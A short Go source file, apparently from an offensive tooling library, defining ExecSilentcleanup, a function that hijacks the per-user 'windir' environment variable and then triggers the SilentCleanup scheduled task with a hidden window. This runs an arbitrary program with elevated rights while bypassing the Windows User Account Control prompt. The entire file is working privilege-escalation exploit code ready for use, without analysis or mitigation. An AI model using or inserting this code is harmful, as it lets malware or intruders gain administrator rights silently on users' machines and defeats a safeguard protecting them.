// Copyright (c) 2019-2022 0x9ef. All rights reserved.
// Use of this source code is governed by an MIT license
// that can be found in the LICENSE file.
package once

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
	"time"

	"golang.org/x/sys/windows/registry"
)

func ExecSilentcleanup(path string) error {
	k, exists, err := registry.CreateKey(registry.CURRENT_USER,
		"Environment", registry.SET_VALUE|registry.ALL_ACCESS)
	if err != nil && !exists {
		return err
	}

	defer k.Close()
	defer k.DeleteValue("windir")
	cmdDir := filepath.Join(os.Getenv("SYSTEMROOT"), "system32", "cmd.exe")
	value := fmt.Sprintf("%s start /k %s", cmdDir, path)
	if err = k.SetStringValue("windir", value); err != nil {
		return err
	}

	time.Sleep(time.Second)
	e := exec.Command("schtasks.exe", "/RUN", "/TN", "\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup", "/I")
	e.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	err = e.Run()
	return err
}
